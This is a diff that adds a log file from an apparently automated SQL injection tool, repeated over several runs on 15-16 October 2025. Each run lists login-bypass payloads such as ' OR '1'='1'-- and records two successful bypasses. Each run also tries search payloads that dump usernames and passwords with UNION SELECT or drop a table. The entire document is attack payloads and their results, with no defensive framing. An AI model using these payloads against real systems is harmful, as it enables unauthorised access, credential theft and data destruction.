@@ -1,0 +1,140 @@
+2025-10-15 14:41:22,625 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-15 14:41:23,766 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-15 14:41:24,819 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-15 14:41:25,893 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-15 14:41:26,949 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-15 14:50:53,368 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-15 14:50:53,369 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-15 14:50:53,369 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-15 14:50:53,459 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-15 14:50:54,461 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-15 14:50:54,590 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-15 14:50:55,592 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-15 14:50:56,675 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-15 14:50:57,735 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-15 14:50:58,845 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-15 14:50:58,899 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-15 14:50:59,469 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-15 14:51:00,003 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-15 14:51:00,543 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-15 14:51:01,047 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-15 15:00:36,575 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-15 15:00:36,576 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-15 15:00:36,576 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-15 15:00:36,619 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-15 15:00:37,620 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-15 15:00:37,666 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-15 15:00:38,668 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-15 15:00:39,697 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-15 15:00:40,717 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-15 15:00:41,756 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-15 15:00:41,788 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-15 15:00:42,305 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-15 15:00:42,820 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-15 15:00:43,332 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-15 15:00:43,835 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-15 20:33:52,543 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-15 20:33:52,549 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-15 20:33:52,551 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-15 20:33:52,936 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-15 20:33:53,939 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-15 20:33:54,058 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-15 20:33:55,060 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-15 20:33:56,204 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-15 20:33:57,301 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-15 20:33:58,380 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-15 20:33:58,507 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-15 20:33:59,047 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-15 20:33:59,633 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-15 20:34:00,176 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-15 20:34:00,682 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-15 20:54:18,369 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-15 20:54:18,377 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-15 20:54:18,379 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-15 20:54:19,805 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-15 20:54:20,806 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-15 20:54:20,936 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-15 20:54:21,938 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-15 20:54:23,123 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-15 20:54:24,351 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-15 20:54:25,398 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-15 20:54:25,547 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-15 20:54:26,140 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-15 20:54:26,728 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-15 20:54:27,342 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-15 20:54:27,852 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-16 01:13:11,411 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-16 01:13:11,420 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-16 01:13:11,421 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-16 01:13:11,820 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-16 01:13:12,822 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-16 01:13:12,967 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-16 01:13:13,969 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-16 01:13:15,065 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-16 01:13:16,104 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-16 01:13:17,174 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-16 01:13:17,280 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-16 01:13:17,820 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-16 01:13:18,385 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-16 01:13:18,932 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-16 01:13:19,443 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-16 02:21:54,591 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-16 02:21:54,601 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-16 02:21:54,603 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-16 02:21:55,482 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-16 02:21:56,484 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-16 02:21:56,621 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-16 02:21:57,624 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-16 02:21:58,742 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-16 02:21:59,888 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-16 02:22:00,957 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-16 02:22:01,067 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-16 02:22:01,646 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-16 02:22:02,264 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-16 02:22:02,812 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-16 02:22:03,316 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-16 02:37:33,884 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-16 02:37:33,892 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-16 02:37:33,893 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-16 02:37:34,266 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-16 02:37:35,267 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-16 02:37:35,358 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-16 02:37:36,360 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-16 02:37:37,430 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-16 02:37:38,463 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-16 02:37:39,521 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-16 02:37:39,586 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-16 02:37:40,113 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-16 02:37:40,641 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-16 02:37:41,164 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-16 02:37:41,673 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-16 02:38:51,916 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-16 02:38:51,917 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-16 02:38:51,917 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-16 02:38:52,011 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-16 02:38:53,012 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-16 02:38:53,127 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-16 02:38:54,128 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-16 02:38:55,171 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-16 02:38:56,249 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-16 02:38:57,284 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-16 02:38:57,321 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-16 02:38:57,899 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-16 02:38:58,465 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-16 02:38:59,031 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-16 02:38:59,537 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
+2025-10-16 08:59:28,420 - SQLI - INFO - 🚀 Starting Comprehensive SQL Injection Attack
+2025-10-16 08:59:28,426 - SQLI - INFO - 🔓 Testing SQL Injection - Login Bypass
+2025-10-16 08:59:28,427 - SQLI - INFO - Testing payload 1: ' OR '1'='1'--
+2025-10-16 08:59:29,026 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR '1'='1'--
+2025-10-16 08:59:30,027 - SQLI - INFO - Testing payload 2: ' OR 1=1--
+2025-10-16 08:59:30,074 - SQLI - CRITICAL - 🚨 SUCCESSFUL LOGIN BYPASS with: ' OR 1=1--
+2025-10-16 08:59:31,075 - SQLI - INFO - Testing payload 3: admin'--
+2025-10-16 08:59:32,138 - SQLI - INFO - Testing payload 4: ' OR 'a'='a
+2025-10-16 08:59:33,226 - SQLI - INFO - Testing payload 5: admin'/*
+2025-10-16 08:59:34,273 - SQLI - INFO - 🔍 Testing SQL Injection - Search Function
+2025-10-16 08:59:34,427 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' UNION SELECT username, password FROM Users--
+2025-10-16 08:59:35,059 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' AND 1=1--
+2025-10-16 08:59:35,606 - SQLI - WARNING - ⚠️ Possible SQLi in search: '; DROP TABLE Products--
+2025-10-16 08:59:36,172 - SQLI - WARNING - ⚠️ Possible SQLi in search: ' OR EXISTS(SELECT * FROM Users)--
+2025-10-16 08:59:36,689 - SQLI - INFO - 📄 SQL Injection report saved: 2 successful bypasses
